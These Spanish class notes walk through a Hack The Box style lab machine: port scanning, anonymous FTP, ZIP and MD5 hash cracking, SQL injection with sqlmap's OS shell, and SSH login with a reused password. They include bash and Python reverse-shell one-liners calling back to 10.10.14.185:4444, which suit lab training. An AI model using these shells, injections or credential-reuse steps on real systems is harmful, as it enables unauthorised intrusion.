## ① Metodología general de una máquina HTB

1. **Ping** → Verificar conectividad
2. **Nmap** → Escaneo de puertos (básico + exhaustivo)
3. **Enumeración por puerto** → FTP, SSH, HTTP, etc.
4. **Explotación** → Sacar flag de usuario
5. **Escalada de privilegios** → Sacar flag de root

> [!important] No hay que memorizar comandos
> Cada máquina es diferente. Lo que importa es entender **por qué** haces cada paso, no memorizar la secuencia.

## ② Paso 1 — Ping y Nmap

```bash
ping IP   # TTL 63 → Linux (64 - 1 salto VPN)
```

**Escaneo básico:**
```bash
nmap -sC -sV -p- --open --min-rate 5000 IP
```

**Resultado:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH |
| 80 | HTTP | Apache |

**Escaneo específico:**
```bash
nmap -sC -sV -p 21,22,80 IP
```

> [!important] Recordatorio de Nmap
> - `SC` → Scripts básicos (detecta Anonymous FTP)
> - `SV` → Versiones
> - `min-rate 5000` → Más rápido
> - Lanzar **dos veces** por si algún puerto tarda en levantar

## ③ Paso 2 — FTP con Anonymous

```bash
ftp IP
# Usuario: Anonymous
# Contraseña: (vacía)
ls              # Ver archivos
get backup.zip  # Descargar
exit
```

> [!important] FTP es como un pendrive dentro de la red
> Si consigues subir un archivo al FTP y ese archivo sale en la web, tienes un vector de ataque.

## ④ Paso 3 — Crackear el zip

**Sacar el hash:**
```bash
zip2john backup.zip > hash.txt
```

**Crackear con John:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Resultado:** `MEGASECRET`

> [!important] John vs HashCat
> - **John**: más cómodo para este tipo de hashes (zip, pdf)
> - **HashCat**: más potente pero más complejo, mejor para GPU
> - Para ZIP → siempre John con zip2john

## ⑤ Paso 4 — Descomprimir y encontrar credenciales

```bash
unzip backup.zip  # Contraseña: MEGASECRET
```

**Archivos encontrados:**
- `index.php` → Código fuente de la web
- `style.css`

En `index.php` hay un hash MD5 en el código: `0d0563...`

**Crackear el MD5:**
```bash
# CrackStation online
# Resultado: password789
```

**Credenciales encontradas:** `admin` / `password789`

## ⑥ Paso 5 — SQL Injection con SQLMap

### Identificación del parámetro vulnerable

En el formulario de búsqueda, si metes una comilla y sale un error de SQL → hay SQL Injection.

### Configurar el proxy con Burp Suite

1. Activar proxy (Foxy Proxy o configuración manual)
2. Ir al formulario de búsqueda
3. Activar Intercept en Burp
4. Buscar → Capturar la petición
5. Copiar la cookie de sesión

### Lanzar SQLMap con cookie

```bash
sqlmap --url="http://IP/index.php?search=test" --cookie="PHPSESSID=tu_cookie" --batch
```

**Resultado:** Parámetro `search` vulnerable a SQL Injection (boolean, error, stacked, time-based)

### Obtener shell con SQLMap

```bash
sqlmap --url="http://IP/index.php?search=test" --cookie="PHPSESSID=tu_cookie" --os-shell
```

> [!important] SQLMap necesita autenticación
> Si el formulario solo funciona con login, SQLMap necesita la cookie para hacer las peticiones autenticadas.

## ⑦ Paso 6 — Reverse Shell

### Configurar listener

```bash
nc -lvnp 4444
```

### Generar reverse shell (desde repsales.com)

```bash
bash -i >& /dev/tcp/10.10.14.185/4444 0>&1
```

**Desde SQLMap os-shell:**
```bash
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.14.185',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
```

> [!important] repsales.com
> Página para generar reverse shells. Si una no funciona, prueba otra. Cada máquina tiene configuraciones diferentes.

## ⑧ Paso 7 — Estabilización de shell

### Shell completa con Python

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**¿Qué hace cada comando?**

| Comando | Función |
|---------|---------|
| `python3 -c "import pty; pty.spawn('/bin/bash')"` | Crea pseudo-terminal |
| `Ctrl+Z` | Suspende proceso, va a background |
| `stty raw -echo` | Terminal en modo crudo, sin eco local |
| `fg` | Trae proceso de background a foreground |
| `export TERM=xterm` | Permite usar `clear`, `vim`, etc. |

> [!important] Sin esto no puedes usar Control C, historial ni editores
> La shell por defecto es limitada. Siempre estabilizar después de conseguir acceso.

## ⑨ Paso 8 — Escalada de privilegios

### Buscar usuarioRobert

```bash
cat /etc/passwd  # Usuarios del sistema
```

### Conectar por SSH con credenciales reutilizadas

```bash
ssh robert@IP
# Contraseña: MEGASECRET
```

> [!important] Reutilización de contraseñas
> Si encontraste una contraseña en el FTP, **pruébala con todos los usuarios**. Mucha gente reutiliza contraseñas.

## ⑩ Notas de clase

- **Metodología paso a paso**: No saltarse pasos. Cada máquina tiene su ritmo.
- **FTP Anonymous**: Siempre probar a descargar y ver qué hay.
- **Crackeo de hashes**: zip2john + John es la combinación más rápida.
- **SQLMap con cookie**: Necesario cuando el formulario requiere login.
- **repsales.com**: Para generar reverse shells. Probar varias si una no funciona.
- **Estabilización**: Siempre después de conseguir shell. Python + Ctrl+Z + stty + export.
- **Reutilización de contraseñas**: Si encontraste una contraseña, pruébala con todos los usuarios.
